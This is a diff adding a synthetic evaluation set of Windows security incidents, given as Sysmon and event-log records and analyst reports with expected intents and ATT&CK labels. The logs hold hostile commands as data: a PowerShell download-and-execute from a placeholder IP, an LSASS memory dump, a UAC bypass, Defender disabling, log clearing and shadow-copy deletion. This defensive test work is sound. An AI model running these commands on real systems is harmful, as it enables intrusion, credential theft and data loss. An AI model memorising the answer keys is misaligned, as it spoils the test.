@@ -1,0 +1,225 @@
+{
+  "version": "intent-eval-1.0",
+  "note": "SYNTHETIC evaluation set for Part 1 (intent extraction). Incidents follow paper 968 Section 6.1: the events of one recording presented as structured records (Sysmon, Windows Security, PowerShell) with a templated one-line summary; two cases are free-text analyst reports. 'expected.intents' lists the acceptable labels (first = preferred); 'techniques_any' passes when any validated technique (or its parent) is listed; 'entities' must each occur in an extracted entity (case-insensitive substring); 'observed' categories must be observed; 'stated_gaps' are the only categories the input itself says are missing. No real system, user or address is involved.",
+  "cases": [
+    {
+      "id": "C01-execution-encoded-powershell",
+      "tactic": "execution",
+      "submission": {
+        "source": "log_excerpt",
+        "title": "SYNTHETIC recording 1",
+        "description": "SYNTHETIC. Recorded host telemetry: 4 events from Sysmon and PowerShell on host WS-FIN-042 between 08:14 and 08:16 UTC.",
+        "log_excerpt": "EventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=WS-FIN-042 User=CORP\\jdoe Image=C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE CommandLine=\"WINWORD.EXE\" /n \"C:\\Users\\jdoe\\Downloads\\Invoice_8841.docm\" ParentImage=C:\\Windows\\explorer.exe\nEventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=WS-FIN-042 User=CORP\\jdoe Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine=powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA ParentImage=C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\nEventCode=4104 Channel=Microsoft-Windows-PowerShell/Operational Computer=WS-FIN-042 ScriptBlockText=IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')\nEventCode=3 Channel=Microsoft-Windows-Sysmon/Operational Computer=WS-FIN-042 Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe DestinationIp=198.51.100.23 DestinationPort=80"
+      },
+      "expected": {
+        "intents": ["suspicious_process_execution", "malware_investigation"],
+        "techniques_any": ["T1059.001", "T1059", "T1204.002", "T1204", "T1105", "T1027"],
+        "entities": {"hosts": ["WS-FIN-042"], "users": ["jdoe"], "ips": ["198.51.100.23"], "processes": ["powershell.exe"]},
+        "observed": ["process_telemetry", "script_execution", "network_traffic"],
+        "stated_gaps": []
+      }
+    },
+    {
+      "id": "C02-persistence-run-key",
+      "tactic": "persistence",
+      "submission": {
+        "source": "log_excerpt",
+        "title": "SYNTHETIC recording 2",
+        "description": "SYNTHETIC. Recorded host telemetry: 2 events from Sysmon on host WS-HR-019 at 10:02 UTC.",
+        "log_excerpt": "EventCode=13 Channel=Microsoft-Windows-Sysmon/Operational Computer=WS-HR-019 User=CORP\\asmith Image=C:\\Users\\asmith\\AppData\\Roaming\\updater\\updater.exe TargetObject=HKU\\S-1-5-21-1004\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveUpdate Details=C:\\Users\\asmith\\AppData\\Roaming\\updater\\updater.exe /silent\nEventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=WS-HR-019 User=CORP\\asmith Image=C:\\Users\\asmith\\AppData\\Roaming\\updater\\updater.exe CommandLine=updater.exe /silent ParentImage=C:\\Windows\\explorer.exe"
+      },
+      "expected": {
+        "intents": ["command_and_control_persistence", "malware_investigation"],
+        "techniques_any": ["T1547.001", "T1547", "T1112"],
+        "entities": {"hosts": ["WS-HR-019"], "users": ["asmith"], "processes": ["updater.exe"]},
+        "observed": ["registry", "process_telemetry"],
+        "stated_gaps": []
+      }
+    },
+    {
+      "id": "C03-privesc-fodhelper-uac-bypass",
+      "tactic": "privilege-escalation",
+      "submission": {
+        "source": "log_excerpt",
+        "title": "SYNTHETIC recording 3",
+        "description": "SYNTHETIC. Recorded host telemetry: 4 events from Sysmon on host WS-ENG-007 between 13:40 and 13:41 UTC.",
+        "log_excerpt": "EventCode=13 Channel=Microsoft-Windows-Sysmon/Operational Computer=WS-ENG-007 User=CORP\\mlopez Image=C:\\Windows\\System32\\reg.exe TargetObject=HKU\\S-1-5-21-1007\\Software\\Classes\\ms-settings\\Shell\\Open\\command\\(Default) Details=C:\\Users\\Public\\run.cmd\nEventCode=13 Channel=Microsoft-Windows-Sysmon/Operational Computer=WS-ENG-007 User=CORP\\mlopez Image=C:\\Windows\\System32\\reg.exe TargetObject=HKU\\S-1-5-21-1007\\Software\\Classes\\ms-settings\\Shell\\Open\\command\\DelegateExecute Details=(Empty)\nEventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=WS-ENG-007 User=CORP\\mlopez Image=C:\\Windows\\System32\\fodhelper.exe IntegrityLevel=Medium ParentImage=C:\\Windows\\explorer.exe\nEventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=WS-ENG-007 User=CORP\\mlopez Image=C:\\Windows\\System32\\cmd.exe CommandLine=cmd.exe /c C:\\Users\\Public\\run.cmd IntegrityLevel=High ParentImage=C:\\Windows\\System32\\fodhelper.exe"
+      },
+      "expected": {
+        "intents": ["privilege_escalation", "defense_evasion"],
+        "techniques_any": ["T1548.002", "T1548"],
+        "entities": {"hosts": ["WS-ENG-007"], "users": ["mlopez"], "processes": ["fodhelper.exe"]},
+        "observed": ["registry", "process_telemetry"],
+        "stated_gaps": []
+      }
+    },
+    {
+      "id": "C04-defense-evasion-defender-and-log-clear",
+      "tactic": "defense-evasion",
+      "submission": {
+        "source": "log_excerpt",
+        "title": "SYNTHETIC recording 4",
+        "description": "SYNTHETIC. Recorded host telemetry: 4 events from PowerShell, Sysmon and Windows Security on host WS-OPS-003 between 21:05 and 21:07 UTC.",
+        "log_excerpt": "EventCode=4104 Channel=Microsoft-Windows-PowerShell/Operational Computer=WS-OPS-003 ScriptBlockText=Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true\nEventCode=13 Channel=Microsoft-Windows-Sysmon/Operational Computer=WS-OPS-003 User=CORP\\svc_backup Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe TargetObject=HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware Details=DWORD (0x00000001)\nEventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=WS-OPS-003 User=CORP\\svc_backup Image=C:\\Windows\\System32\\wevtutil.exe CommandLine=wevtutil cl Security ParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nEventCode=1102 Channel=Security Computer=WS-OPS-003 SubjectUserName=svc_backup Message=The audit log was cleared."
+      },
+      "expected": {
+        "intents": ["defense_evasion"],
+        "techniques_any": ["T1685", "T1685.005", "T1685.001", "T1562.001", "T1562", "T1070.001", "T1070", "T1112"],
+        "entities": {"hosts": ["WS-OPS-003"], "users": ["svc_backup"], "processes": ["wevtutil.exe"]},
+        "observed": ["script_execution", "registry", "process_telemetry"],
+        "stated_gaps": []
+      }
+    },
+    {
+      "id": "C05-credential-access-lsass-dump",
+      "tactic": "credential-access",
+      "submission": {
+        "source": "log_excerpt",
+        "title": "SYNTHETIC recording 5",
+        "description": "SYNTHETIC. Recorded host telemetry: 3 events from Sysmon on host SRV-APP-03 at 02:31 UTC. The bundle does not include network telemetry.",
+        "log_excerpt": "EventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=SRV-APP-03 User=CORP\\it_admin Image=C:\\Windows\\System32\\rundll32.exe CommandLine=rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 652 C:\\Windows\\Temp\\lsass.dmp full ParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nEventCode=10 Channel=Microsoft-Windows-Sysmon/Operational Computer=SRV-APP-03 SourceImage=C:\\Windows\\System32\\rundll32.exe TargetImage=C:\\Windows\\System32\\lsass.exe GrantedAccess=0x1FFFFF\nEventCode=11 Channel=Microsoft-Windows-Sysmon/Operational Computer=SRV-APP-03 Image=C:\\Windows\\System32\\rundll32.exe TargetFilename=C:\\Windows\\Temp\\lsass.dmp"
+      },
+      "expected": {
+        "intents": ["credential_compromise"],
+        "techniques_any": ["T1003.001", "T1003"],
+        "entities": {"hosts": ["SRV-APP-03"], "users": ["it_admin"], "processes": ["rundll32.exe"]},
+        "observed": ["process_telemetry", "file_activity"],
+        "stated_gaps": ["network_traffic"]
+      }
+    },
+    {
+      "id": "C06-discovery-domain-enumeration",
+      "tactic": "discovery",
+      "submission": {
+        "source": "log_excerpt",
+        "title": "SYNTHETIC recording 6",
+        "description": "SYNTHETIC. Recorded host telemetry: 4 events from Sysmon on host WS-ENG-011 between 16:20 and 16:22 UTC.",
+        "log_excerpt": "EventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=WS-ENG-011 User=CORP\\tlee Image=C:\\Windows\\System32\\whoami.exe CommandLine=whoami /all ParentImage=C:\\Windows\\System32\\cmd.exe\nEventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=WS-ENG-011 User=CORP\\tlee Image=C:\\Windows\\System32\\net.exe CommandLine=net group \"Domain Admins\" /domain ParentImage=C:\\Windows\\System32\\cmd.exe\nEventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=WS-ENG-011 User=CORP\\tlee Image=C:\\Windows\\System32\\nltest.exe CommandLine=nltest /domain_trusts ParentImage=C:\\Windows\\System32\\cmd.exe\nEventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=WS-ENG-011 User=CORP\\tlee Image=C:\\Windows\\System32\\net.exe CommandLine=net user /domain ParentImage=C:\\Windows\\System32\\cmd.exe"
+      },
+      "expected": {
+        "intents": ["discovery"],
+        "techniques_any": ["T1087.002", "T1087", "T1069.002", "T1069", "T1482", "T1033"],
+        "entities": {"hosts": ["WS-ENG-011"], "users": ["tlee"], "processes": ["net.exe"]},
+        "observed": ["process_telemetry"],
+        "stated_gaps": []
+      }
+    },
+    {
+      "id": "C07-lateral-movement-psexec",
+      "tactic": "lateral-movement",
+      "submission": {
+        "source": "log_excerpt",
+        "title": "SYNTHETIC recording 7",
+        "description": "SYNTHETIC. Recorded host telemetry: 4 events from Windows Security and Sysmon on host SRV-FILE-01 between 11:47 and 11:48 UTC.",
+        "log_excerpt": "EventCode=4624 Channel=Security Computer=SRV-FILE-01 LogonType=3 TargetUserName=adm_rkhan IpAddress=10.20.4.15 AuthenticationPackageName=NTLM\nEventCode=4697 Channel=Security Computer=SRV-FILE-01 SubjectUserName=adm_rkhan ServiceName=PSEXESVC ServiceFileName=%SystemRoot%\\PSEXESVC.exe\nEventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=SRV-FILE-01 User=NT AUTHORITY\\SYSTEM Image=C:\\Windows\\PSEXESVC.exe ParentImage=C:\\Windows\\System32\\services.exe\nEventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=SRV-FILE-01 User=CORP\\adm_rkhan Image=C:\\Windows\\System32\\cmd.exe CommandLine=cmd.exe /c ipconfig /all ParentImage=C:\\Windows\\PSEXESVC.exe"
+      },
+      "expected": {
+        "intents": ["lateral_movement"],
+        "techniques_any": ["T1021.002", "T1021", "T1569.002", "T1569", "T1570"],
+        "entities": {"hosts": ["SRV-FILE-01"], "users": ["adm_rkhan"], "ips": ["10.20.4.15"], "processes": ["PSEXESVC.exe"]},
+        "observed": ["authentication", "scheduled_tasks_services", "process_telemetry"],
+        "stated_gaps": []
+      }
+    },
+    {
+      "id": "C08-impact-inhibit-recovery",
+      "tactic": "impact",
+      "submission": {
+        "source": "log_excerpt",
+        "title": "SYNTHETIC recording 8",
+        "description": "SYNTHETIC. Recorded host telemetry: 3 events from Sysmon on host SRV-DB-02 between 03:10 and 03:11 UTC.",
+        "log_excerpt": "EventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=SRV-DB-02 User=CORP\\svc_sql Image=C:\\Windows\\System32\\vssadmin.exe CommandLine=vssadmin.exe delete shadows /all /quiet ParentImage=C:\\Windows\\System32\\cmd.exe\nEventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=SRV-DB-02 User=CORP\\svc_sql Image=C:\\Windows\\System32\\wbem\\WMIC.exe CommandLine=wmic shadowcopy delete ParentImage=C:\\Windows\\System32\\cmd.exe\nEventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=SRV-DB-02 User=CORP\\svc_sql Image=C:\\Windows\\System32\\bcdedit.exe CommandLine=bcdedit /set {default} recoveryenabled No ParentImage=C:\\Windows\\System32\\cmd.exe"
+      },
+      "expected": {
+        "intents": ["system_impact", "ransomware_investigation"],
+        "techniques_any": ["T1490"],
+        "entities": {"hosts": ["SRV-DB-02"], "users": ["svc_sql"], "processes": ["vssadmin.exe"]},
+        "observed": ["process_telemetry"],
+        "stated_gaps": []
+      }
+    },
+    {
+      "id": "C09-impact-ransomware-encryption",
+      "tactic": "impact",
+      "submission": {
+        "source": "log_excerpt",
+        "title": "SYNTHETIC recording 9",
+        "description": "SYNTHETIC. Recorded host telemetry: 4 events from Sysmon on host FS-02 between 04:00 and 04:02 UTC.",
+        "log_excerpt": "EventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=FS-02 User=CORP\\backup_op Image=C:\\ProgramData\\svch0st.exe CommandLine=svch0st.exe -path \\\\FS-02\\Finance ParentImage=C:\\Windows\\System32\\cmd.exe\nEventCode=11 Channel=Microsoft-Windows-Sysmon/Operational Computer=FS-02 Image=C:\\ProgramData\\svch0st.exe TargetFilename=D:\\Finance\\Q3_budget.xlsx.lockbit\nEventCode=11 Channel=Microsoft-Windows-Sysmon/Operational Computer=FS-02 Image=C:\\ProgramData\\svch0st.exe TargetFilename=D:\\Finance\\payroll_2026.csv.lockbit\nEventCode=11 Channel=Microsoft-Windows-Sysmon/Operational Computer=FS-02 Image=C:\\ProgramData\\svch0st.exe TargetFilename=D:\\Finance\\README_RESTORE_FILES.txt"
+      },
+      "expected": {
+        "intents": ["ransomware_investigation"],
+        "techniques_any": ["T1486"],
+        "entities": {"hosts": ["FS-02"], "users": ["backup_op"], "processes": ["svch0st.exe"]},
+        "observed": ["file_activity", "process_telemetry"],
+        "stated_gaps": []
+      }
+    },
+    {
+      "id": "C10-credential-access-brute-force",
+      "tactic": "credential-access",
+      "submission": {
+        "source": "log_excerpt",
+        "title": "SYNTHETIC recording 10",
+        "description": "SYNTHETIC. Recorded host telemetry: 4 events from Windows Security on host SRV-RDP-01 between 01:12 and 01:19 UTC.",
+        "log_excerpt": "EventCode=4625 Channel=Security Computer=SRV-RDP-01 TargetUserName=administrator IpAddress=203.0.113.77 LogonType=10 FailureReason=Unknown user name or bad password Count=212\nEventCode=4625 Channel=Security Computer=SRV-RDP-01 TargetUserName=backup IpAddress=203.0.113.77 LogonType=10 FailureReason=Unknown user name or bad password Count=187\nEventCode=4625 Channel=Security Computer=SRV-RDP-01 TargetUserName=sqladmin IpAddress=203.0.113.77 LogonType=10 FailureReason=Unknown user name or bad password Count=164\nEventCode=4624 Channel=Security Computer=SRV-RDP-01 TargetUserName=backup IpAddress=203.0.113.77 LogonType=10"
+      },
+      "expected": {
+        "intents": ["credential_compromise"],
+        "techniques_any": ["T1110", "T1110.001", "T1110.003", "T1078", "T1021.001"],
+        "entities": {"hosts": ["SRV-RDP-01"], "users": ["backup"], "ips": ["203.0.113.77"]},
+        "observed": ["authentication"],
+        "stated_gaps": []
+      }
+    },
+    {
+      "id": "C11-persistence-scheduled-task",
+      "tactic": "persistence",
+      "submission": {
+        "source": "log_excerpt",
+        "title": "SYNTHETIC recording 11",
+        "description": "SYNTHETIC. Recorded host telemetry: 2 events from Windows Security and Sysmon on host WS-HR-021 at 09:30 UTC.",
+        "log_excerpt": "EventCode=4698 Channel=Security Computer=WS-HR-021 SubjectUserName=jdoe TaskName=\\Microsoft\\Windows\\Maintenance\\SysHealth TaskContent=<Exec><Command>C:\\ProgramData\\syshealth.exe</Command></Exec> Trigger=Daily 09:00\nEventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=WS-HR-021 User=CORP\\jdoe Image=C:\\Windows\\System32\\schtasks.exe CommandLine=schtasks /create /tn \\Microsoft\\Windows\\Maintenance\\SysHealth /tr C:\\ProgramData\\syshealth.exe /sc daily /st 09:00 ParentImage=C:\\Windows\\System32\\cmd.exe"
+      },
+      "expected": {
+        "intents": ["command_and_control_persistence"],
+        "techniques_any": ["T1053.005", "T1053"],
+        "entities": {"hosts": ["WS-HR-021"], "users": ["jdoe"], "processes": ["schtasks.exe"]},
+        "observed": ["scheduled_tasks_services", "process_telemetry"],
+        "stated_gaps": []
+      }
+    },
+    {
+      "id": "C12-phishing-analyst-report",
+      "tactic": "initial-access",
+      "submission": {
+        "source": "analyst_description",
+        "title": "SYNTHETIC phishing report",
+        "description": "SYNTHETIC. User kpatel reported an email from billing@invoices-example.test with the subject 'Overdue invoice 4471' that asked her to open an attached HTML file and sign in to view the invoice. The attachment opened a fake sign-in page hosted at login-portal-example.test. She says she did not enter her password. The report does not include the original email headers or a hash of the attachment."
+      },
+      "expected": {
+        "intents": ["phishing_investigation"],
+        "techniques_any": ["T1566", "T1566.001", "T1566.002", "T1598", "T1598.002", "T1598.003"],
+        "entities": {"users": ["kpatel"], "domains": ["login-portal-example.test"]},
+        "observed": ["email"],
+        "stated_gaps": ["email", "indicators_of_compromise", "file_activity"]
+      }
+    },
+    {
+      "id": "C13-insufficient-information",
+      "tactic": "none",
+      "submission": {
+        "source": "analyst_description",
+        "title": "SYNTHETIC vague report",
+        "description": "SYNTHETIC. A user said their laptop has felt slow since this morning. No alerts, logs or other details were provided."
+      },
+      "expected": {
+        "intents": ["unknown"],
+        "techniques_any": [],
+        "entities": {},
+        "observed": [],
+        "stated_gaps": ["*"]
+      }
+    }
+  ]
+}
